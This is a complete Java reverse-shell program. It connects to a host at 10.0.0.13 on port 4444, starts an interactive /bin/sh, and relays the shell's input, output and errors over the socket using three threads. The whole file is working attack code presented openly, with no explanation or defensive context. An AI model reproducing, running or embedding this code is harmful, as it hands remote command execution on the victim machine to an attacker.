// Java reverse shell
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class Revshell {
    public static void main(String[] args) throws Exception {
        Socket s = new Socket("10.0.0.13", 4444);
        Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-i"});
        InputStream sIn = s.getInputStream();
        OutputStream sOut = s.getOutputStream();
        InputStream pOut = p.getInputStream();
        InputStream pErr = p.getErrorStream();
        OutputStream pIn = p.getOutputStream();
        new Thread(() -> { try { sIn.transferTo(pIn); } catch (Exception e) {} }).start();
        new Thread(() -> { try { pOut.transferTo(sOut); } catch (Exception e) {} }).start();
        new Thread(() -> { try { pErr.transferTo(sOut); } catch (Exception e) {} }).start();
        p.waitFor();
        s.close();
    }
}
